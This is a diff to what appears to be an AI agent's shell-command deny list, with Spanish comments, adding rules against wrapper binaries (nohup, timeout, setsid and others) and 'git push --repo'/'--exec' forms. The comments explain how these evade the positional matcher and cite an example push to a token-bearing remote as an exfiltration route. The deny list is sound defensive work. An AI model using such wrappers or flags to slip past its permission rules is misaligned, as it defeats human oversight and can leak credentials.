@@ -111,6 +111,16 @@
         - 'ksh *'
         - 'xargs *'
         - 'env -i *'
+        # Wrappers que ejecutan otro binario: dejan al comando denegado en el
+        # token 2+, donde el matcher posicional ya no lo mira (`nohup bash -c`
+        # tiene `nohup` en el token 1). `env` sin `-i` cae en `env *`, mas
+        # abajo con el resto del bloque de credenciales.
+        - 'nohup *'
+        - 'timeout *'
+        - 'nice *'
+        - 'command *'
+        - 'setsid *'
+        - 'watch *'
         - 'sudo *'
         - 'su *'
         - 'shutdown *'
@@ -156,6 +166,19 @@
         - 'git push * http* *'
         - 'git push git@*'
         - 'git push git@* *'
+        # `--repo=<url>` mete el remoto en un FLAG, asi que el token 2 no
+        # empieza con `http`/`git@` y esquivaba los denies de arriba —
+        # `git push --repo=https://<token>@github.com/otro/x HEAD` volvia a
+        # abrir el canal de exfiltracion que este bloque cierra. `--exec`
+        # ejecuta un binario del otro lado.
+        - 'git push --repo*'
+        - 'git push --repo* *'
+        - 'git push * --repo*'
+        - 'git push * --repo* *'
+        - 'git push --exec*'
+        - 'git push --exec* *'
+        - 'git push * --exec*'
+        - 'git push * --exec* *'
         - 'git push * git@*'
         - 'git push * git@* *'
         - 'git remote add *'
